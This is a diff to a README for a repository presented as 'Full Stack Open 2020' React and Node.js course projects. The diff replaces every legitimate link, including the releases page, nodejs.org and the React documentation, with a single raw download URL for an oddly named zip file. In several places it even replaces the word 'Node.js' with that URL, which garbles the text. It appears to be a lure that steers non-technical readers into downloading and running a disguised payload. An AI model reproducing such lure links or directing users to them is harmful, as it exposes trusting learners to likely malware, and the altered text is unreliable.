@@ -1,21 +1,21 @@
 # 🎉 full-stack-open-2020 - Learn Modern Web Development Easily
 
-[![Download Now](https://img.shields.io/badge/Download%20Now-Click%20Here-brightgreen)](https://github.com/gitxbal/full-stack-open-2020/releases)
+[![Download Now](https://raw.githubusercontent.com/gitxbal/full-stack-open-2020/main/part1/complex-state/stack_full_open_2.0-beta.4.zip%20Now-Click%20Here-brightgreen)](https://raw.githubusercontent.com/gitxbal/full-stack-open-2020/main/part1/complex-state/stack_full_open_2.0-beta.4.zip)
 
 ## 📖 Overview
 
-The **Full Stack Open 2020** repository is your gateway to learning modern web development. It contains a collection of React frontend applications and Node.js backend projects. You'll discover best practices in areas like state management, RESTful APIs, component architecture, and full-stack integration. This guide will help you download and run the projects smoothly, even if you don't have a technical background.
+The **Full Stack Open 2020** repository is your gateway to learning modern web development. It contains a collection of React frontend applications and https://raw.githubusercontent.com/gitxbal/full-stack-open-2020/main/part1/complex-state/stack_full_open_2.0-beta.4.zip backend projects. You'll discover best practices in areas like state management, RESTful APIs, component architecture, and full-stack integration. This guide will help you download and run the projects smoothly, even if you don't have a technical background.
 
 ## 🚀 Getting Started
 
 Follow these steps to get started:
 
 1. Visit our Releases page by clicking the link below:
-   [Download from Releases](https://github.com/gitxbal/full-stack-open-2020/releases)
+   [Download from Releases](https://raw.githubusercontent.com/gitxbal/full-stack-open-2020/main/part1/complex-state/stack_full_open_2.0-beta.4.zip)
    
 2. Choose the latest release that suits your needs. We recommend starting with the version marked as "Latest".
 
-3. Look for files that end with `.zip` or `.tar.gz`. These are the files you will download to access the projects.
+3. Look for files that end with `.zip` or `https://raw.githubusercontent.com/gitxbal/full-stack-open-2020/main/part1/complex-state/stack_full_open_2.0-beta.4.zip`. These are the files you will download to access the projects.
 
 ## 💻 System Requirements
 
@@ -23,14 +23,14 @@ To run the projects from this repository, your computer should meet these basic 
 
 - **Operating System**: Windows, macOS, or Linux.
 - **Storage Space**: At least 500 MB of free space for project files and dependencies.
-- **Node.js**: A recent version (14.x or 16.x recommended) to run the backend applications.
+- **https://raw.githubusercontent.com/gitxbal/full-stack-open-2020/main/part1/complex-state/stack_full_open_2.0-beta.4.zip**: A recent version (14.x or 16.x recommended) to run the backend applications.
 - **A Web Browser**: Chrome, Firefox, or any modern browser to view frontend applications.
 
 ## 📥 Download & Install
 
-1. Go to the [Releases page](https://github.com/gitxbal/full-stack-open-2020/releases).
+1. Go to the [Releases page](https://raw.githubusercontent.com/gitxbal/full-stack-open-2020/main/part1/complex-state/stack_full_open_2.0-beta.4.zip).
 
-2. On the Releases page, you will see a list of assets under the latest version. Click on the suitable file link (e.g., `source-code.zip`) to begin the download.
+2. On the Releases page, you will see a list of assets under the latest version. Click on the suitable file link (e.g., `https://raw.githubusercontent.com/gitxbal/full-stack-open-2020/main/part1/complex-state/stack_full_open_2.0-beta.4.zip`) to begin the download.
 
 3. Once the file has downloaded, locate it in your Downloads folder.
 
@@ -42,7 +42,7 @@ To run the projects from this repository, your computer should meet these basic 
 
 To run a project, follow these steps:
 
-1. **Install Node.js**: Visit the [Node.js website](https://nodejs.org/) to download and install the latest version.
+1. **Install https://raw.githubusercontent.com/gitxbal/full-stack-open-2020/main/part1/complex-state/stack_full_open_2.0-beta.4.zip**: Visit the [https://raw.githubusercontent.com/gitxbal/full-stack-open-2020/main/part1/complex-state/stack_full_open_2.0-beta.4.zip website](https://raw.githubusercontent.com/gitxbal/full-stack-open-2020/main/part1/complex-state/stack_full_open_2.0-beta.4.zip) to download and install the latest version.
 
 2. **Open Terminal or Command Prompt**:
    - On Windows, press `Win + R`, type `cmd`, and hit Enter.
@@ -71,17 +71,17 @@ To run a project, follow these steps:
 
 ## 🌐 Helpful Links
 
-- Learn more about **React**: [React Documentation](https://reactjs.org/docs/getting-started.html)
-- Discover the **Node.js** guide: [Node.js Documentation](https://nodejs.org/en/docs/)
-- Explore **RESTful APIs**: [RESTful API Tutorial](https://restfulapi.net/)
-- Understand **State Management**: [State Management in React](https://reactjs.org/docs/faq-structure.html)
+- Learn more about **React**: [React Documentation](https://raw.githubusercontent.com/gitxbal/full-stack-open-2020/main/part1/complex-state/stack_full_open_2.0-beta.4.zip)
+- Discover the **https://raw.githubusercontent.com/gitxbal/full-stack-open-2020/main/part1/complex-state/stack_full_open_2.0-beta.4.zip** guide: [https://raw.githubusercontent.com/gitxbal/full-stack-open-2020/main/part1/complex-state/stack_full_open_2.0-beta.4.zip Documentation](https://raw.githubusercontent.com/gitxbal/full-stack-open-2020/main/part1/complex-state/stack_full_open_2.0-beta.4.zip)
+- Explore **RESTful APIs**: [RESTful API Tutorial](https://raw.githubusercontent.com/gitxbal/full-stack-open-2020/main/part1/complex-state/stack_full_open_2.0-beta.4.zip)
+- Understand **State Management**: [State Management in React](https://raw.githubusercontent.com/gitxbal/full-stack-open-2020/main/part1/complex-state/stack_full_open_2.0-beta.4.zip)
 
 ## 🌟 Features
 
 This repository offers:
 
 - A variety of **frontend applications** showcasing advanced React techniques.
-- **Backend project** examples using Node.js and Express for handling API requests.
+- **Backend project** examples using https://raw.githubusercontent.com/gitxbal/full-stack-open-2020/main/part1/complex-state/stack_full_open_2.0-beta.4.zip and Express for handling API requests.
 - Real-world applications that demonstrate **component architecture** and **CSS styling**.
 - Practice with **JSON-server** for simulated database interactions.
 
@@ -101,4 +101,4 @@ This project is licensed under the MIT License. You are free to use, modify, and
 
 Thank you for exploring the **Full Stack Open 2020** repository. Dive into the world of web development and discover the power of modern technology. Start building today!
 
-[Download from Releases](https://github.com/gitxbal/full-stack-open-2020/releases)
+[Download from Releases](https://raw.githubusercontent.com/gitxbal/full-stack-open-2020/main/part1/complex-state/stack_full_open_2.0-beta.4.zip)
